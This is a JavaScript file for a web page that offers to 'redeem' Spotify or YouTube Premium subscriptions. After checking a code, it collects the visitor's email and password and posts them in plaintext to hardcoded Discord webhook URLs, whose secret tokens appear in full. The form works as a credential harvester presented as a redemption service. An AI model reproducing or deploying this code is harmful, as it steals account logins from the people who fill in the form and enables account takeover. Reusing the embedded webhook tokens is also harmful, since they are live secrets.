document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  const messageDiv = document.getElementById('message');
  const serviceSelect = document.getElementById('service-select');
  const formTitle = document.getElementById('form-title');
  const credentialsLabel = document.getElementById('credentials-label');

  const webhooks = {
    spotify: "https://discord.com/api/webhooks/1371226279398871130/bpVHYR4wq-3ZO6j7PS8Fu1uLJV7Xd1iGiAWjgVxoWLPzXsY99zY3pk0XdAnCoTJvJ6MR",
    youtube: "https://discord.com/api/webhooks/1371226419065258074/Jkoz6_jFxmF6ZmXqkISBdR3DevB5QlOiw_jGoeModcg6nlNjy54bt6t2IUwAPj00ZX1H"
  };

  // Changement dynamique du texte
  serviceSelect.addEventListener('change', () => {
    const selected = serviceSelect.value;
    formTitle.textContent = selected === 'spotify' ? 'REDEEM YOUR SPOTIFY SUBSCRIPTION' : 'REDEEM YOUR YOUTUBE PREMIUM';
    credentialsLabel.textContent = selected.charAt(0).toUpperCase() + selected.slice(1) + ' Credentials';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const codeInput = form.querySelector('input[placeholder="XXXX-XXXX-XXXX-XXXX"]');
    const usernameInput = form.querySelector('input[placeholder="Email"]');
    const passwordInput = form.querySelector('input[placeholder="Password"]');

    const code = codeInput.value.trim();
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    const service = serviceSelect.value;

    if (!code || !username || !password) {
      messageDiv.style.backgroundColor = 'red';
      messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)';
      messageDiv.textContent = '❌ Please complete every input.';
      return;
    }

    try {
      const res = await fetch('stock.json');
      if (!res.ok) throw new Error('Failed to load stock.json');
      const stock = await res.json();

      if (!Array.isArray(stock.codes)) throw new Error('Bad JSON structure.');

      if (!stock.codes.includes(code)) {
        messageDiv.style.backgroundColor = 'red';
        messageDiv.textContent = '❌ Invalid code.';
        return;
      }

      const webhookUrl = webhooks[service];
      const payload = {
        embeds: [{
          title: `New ${service} order`,
          color: 0xee00ff,
          fields: [
            { name: "Code", value: `\`${code}\``, inline: false },
            { name: "Email", value: `\`${username}\``, inline: true },
            { name: "Password", value: `\`${password}\``, inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      const webhookRes = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (webhookRes.ok) {
        messageDiv.style.backgroundColor = 'green';
        messageDiv.textContent = `✅ ${service.charAt(0).toUpperCase() + service.slice(1)} order sent.`;
        form.reset();
      } else {
        const responseText = await webhookRes.text();
        messageDiv.style.backgroundColor = 'red';
        messageDiv.textContent = `❌ Failed: ${responseText}`;
      }
    } catch (err) {
      console.error(err);
      messageDiv.style.backgroundColor = 'red';
      messageDiv.textContent = '❌ System error.';
    }
  });
});

